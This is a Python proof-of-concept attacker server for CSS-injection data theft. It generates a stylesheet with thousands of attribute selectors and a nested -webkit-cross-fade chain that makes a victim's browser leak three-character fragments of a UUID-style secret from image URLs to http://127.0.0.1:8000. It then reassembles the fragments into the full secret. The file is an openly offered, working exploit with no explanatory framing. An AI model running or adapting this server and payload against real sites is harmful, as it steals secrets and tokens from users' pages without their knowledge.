from http.server import BaseHTTPRequestHandler, HTTPServer
from itertools import product
import urllib.parse
import math

class AttackerServer(BaseHTTPRequestHandler):
    fragments = list()
    charset = "0123456789abcdef-"
    secret_len = 36

    def find_matching(self, fragment: str, fragments: list) -> tuple:
        matching_l, matching_r = set(), set()
        f_first, f_last = fragment[:2], fragment[-2:]
        for c in fragments:
            c_first, c_last = c[:2], c[-2:]
            # aBC + BCd
            if c_first == f_last:
                matching_r.add((fragment[:-2] + c, c))
            # BCd + aBC
            elif c_last == f_first:
                matching_l.add((c + fragment[2:], c))

        return matching_l, matching_r

    def assemble(self, init_fragments: list) -> list:
        sub_steps = [init_fragments]

        while any(len(s) > 1 for s in sub_steps):
            fragments = sub_steps.pop(0)
            fail_ctr = 0

            while len(fragments) > 1:
                # impossible to solve
                if fail_ctr > len(fragments) * 2:
                    break

                f = fragments.pop(0)
                # finished
                if len(fragments) == 0:
                    return f

                l_match, r_match = self.find_matching(f, fragments)
                #print(f"left: {l_match}\nright: {r_match}")
                # Found left and right matching fragments
                if len(l_match) == 1 and len(r_match) == 1:
                    l = l_match.pop()
                    r = r_match.pop()
                    # Remove fitting fragments
                    fragments.remove(l[1])
                    fragments.remove(r[1])

                    fragments.append(l[1][:-2] + f + r[1][2:])
                    fail_ctr = 0
                    print(f"Found double match: '{l[1]}' + '{f}' + '{r[1]}' -> '{l[1][:-2] + f + r[1][2:]}'")
                # Found single match left
                elif len(r_match) == 0 and len(l_match) == 1:
                    l = l_match.pop()
                    # Remove fitting fragments
                    fragments.remove(l[1])
                    fragments.append(l[0])
                    fail_ctr = 0
                    print(f"Found single left match: '{l[1]}' + '{f}' -> '{l[0]}'")
                # Found single match right
                elif len(l_match) == 0 and len(r_match) == 1:
                    r = r_match.pop()
                    # Remove fitting fragments
                    fragments.remove(r[1])
                    fragments.append(r[0])
                    fail_ctr = 0
                    print(f"Found single right match: '{r[1]}' + '{f}' -> '{r[0]}'")
                # Found duplicate match left
                elif len(r_match) == 0 and len(l_match) > 1:
                    l = l_match.pop()
                    fragments_c = fragments.copy()
                    # Remove fitting fragments
                    fragments.remove(l[1])
                    fragments.append(l[0])
                    # Add other possibilities
                    while len(l_match) > 0:
                        fragments_c = fragments_c.copy()
                        l = l_match.pop()
                        # Remove fitting fragments
                        fragments_c.remove(l[1])
                        fragments_c.append(l[0])
                        sub_steps.append(fragments_c)
                    fail_ctr = 0
                    print(f"Found duplicate left matches: '{l[1]}' + '{f}' -> '{l[0]}'")
                # Found duplicate match right
                elif len(l_match) == 0 and len(r_match) > 1:
                    r = r_match.pop()
                    fragments_c = fragments.copy()
                    # Remove fitting fragments
                    fragments.remove(r[1])
                    fragments.append(r[0])
                    # Add other possibilities
                    while len(r_match) > 0:
                        fragments_c = fragments_c.copy()
                        r = r_match.pop()
                        # Remove fitting fragments
                        fragments_c.remove(r[1])
                        fragments_c.append(r[0])
                        sub_steps.append(fragments_c)
                    fail_ctr = 0
                    print(f"Found duplicate right matches: '{r[1]}' + '{f}' -> '{r[0]}'")
                else:
                    fail_ctr += 1
                    fragments.append(f)

            if len(fragments) == 1:
                sub_steps.append(fragments)

        return sub_steps

    def add_fragment(self, fragment: str) -> None:
        # default value
        if fragment == "I": return

        fragment = fragment.replace('M', '-')
        fragment = fragment.replace('S', ' ')
        print(f"Received fragment: {fragment}")
        self.fragments.append(fragment)

        # Check if we received all fragments
        if len(self.fragments) == self.secret_len - 2:
            print(self.fragments, len(self.fragments))
            print(f"Reassembling fragments...")
            secrets = self.assemble(self.fragments)
            if len(secrets) == 0:
                print("Could not assemble secret from fragments.")
            elif len(secrets) == 1:
                print(f"Secret is '{secrets.pop()}'")
            else:
                print("Found multiple possible secrets:")
                for s in secrets:
                    print(f"-> '{s.pop()}'")
            exit()

    def generate_payload(self, fragent_len=3) -> str:
        selector = "img[src*='{val}']{{--{name}: url('http://127.0.0.1:8000/?l={name}') }}\n"

        # Generate all possibe 3-char combinations that can occur in a UUID
        char_combinations = set()
        for i in product([c for c in self.charset], repeat=fragent_len):
            char_combinations.add(''.join(map(str, i)))

        # Generate all CSS selectors and variables
        selectors = []
        variables = set()
        for c in char_combinations:
            var_name = c.replace('-', 'M')
            var_name = c.replace(' ', 'S')
            selectors.append(selector.format(val=c, name=var_name))
            variables.add(var_name)

        crossfade_base = "imgBB --d: url('http://127.0.0.1:8000/?l=I');\nbackground-image:-webkit-cross-fade({},{},50%);BB"
        crossfade_step = "-webkit-cross-fade({},{},50%)"
        crossfade_var = "var(--{}, var(--d))"

        # Generate the crossfade statement
        crossfade = crossfade_base
        tree_depth = math.ceil(math.log2(len(char_combinations)))
        while True:
            u = crossfade_var.format(variables.pop())
            if len(variables) == 1:
                v = crossfade_var.format(variables.pop())
                crossfade = crossfade.format(u, v)
                break
            else:
                crossfade = crossfade.format(crossfade_step, u)
                continue

        # Add braces
        crossfade = crossfade.replace('BB', '{', 1)
        crossfade = crossfade.replace('BB', '}', 1)

        # Build payload
        payload = ""
        for s in selectors:
            payload += s
        payload += crossfade
        # Visualize that the payload had been received and read by the useragent
        payload += "\nbody{background-color: red;}"

        return payload

    def do_GET(self):
        # get client ip and url parameters
        client_ip = self.client_address[0]
        url_parameters = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        path = self.path

        self.handle_request(client_ip, url_parameters, path)

    def do_POST(self):
        # get client ip and post data
        client_ip = self.client_address[0]
        content_length = int(self.headers['Content-Length'])
        post_data = urllib.parse.parse_qs(self.rfile.read(content_length).decode('utf-8'))
        path = self.path

        self.handle_request(client_ip, post_data, path)

    def handle_request(self, client_ip:str, parameters:dict, path:str):
        response = ""
        self.send_response(200)

        # client sent fragment of secret
        if 'l' in parameters:
            self.add_fragment(parameters['l'][0])
            self.send_header('Content-type', 'text/plain')
        # client requests malicious payload
        elif path == "/style.css":
            response = self.generate_payload()
            self.send_header('Content-type', 'text/css')
        else:
            self.send_header('Content-type', 'text/plain')

        # respond to client
        self.end_headers()
        self.wfile.write(response.encode('utf-8'))

def run(server_class=HTTPServer, handler_class=AttackerServer):
    server_address = ('127.0.0.1', 8000)
    httpd = server_class(server_address, handler_class)
    print('Starting http server...')
    httpd.serve_forever()

run()
